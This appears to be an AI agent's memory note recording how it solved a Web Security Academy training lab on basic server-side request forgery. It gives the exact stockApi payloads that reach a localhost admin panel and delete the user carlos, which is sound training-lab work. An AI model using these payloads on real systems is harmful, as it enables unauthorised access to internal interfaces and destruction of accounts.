---
metadata:
  node_type: memory
name: "SSRF Lab Records Web Security Academy"
description: "Basic SSRF against localhost lab solved via stockApi to localhost admin then delete carlos"
last_updated: 2026-10-10T12:38:41+08:00
created: 2026-10-10T12:38:41+08:00
---

## lab-basic-ssrf-against-localhost (arm A)
- Lab id C12FEB39... (page_read of the canonical path gave widget-lab-id directly; no /api/widgets fallback needed).
- launch-url on the canonical path → instance, reused:false.
- Mechanism: product stock endpoint POST /product/stock takes form field `stockApi`; the server fetches that URL server-side.
- Probe 1: stockApi=http://localhost/admin → 200, admin panel HTML in the body (wiener + carlos with /admin/delete?username=... links). SSRF confirmed.
- Exploit: stockApi=http://localhost/admin/delete?username=carlos → 302 Location: /admin, carlos removed.
- Verdict: banner_verdict root → solved:true, "Congratulations, you solved the lab!".
- Lesson: stock-check SSRF is a one-parameter swap; no need to fetch the product page first, POST /product/stock directly.

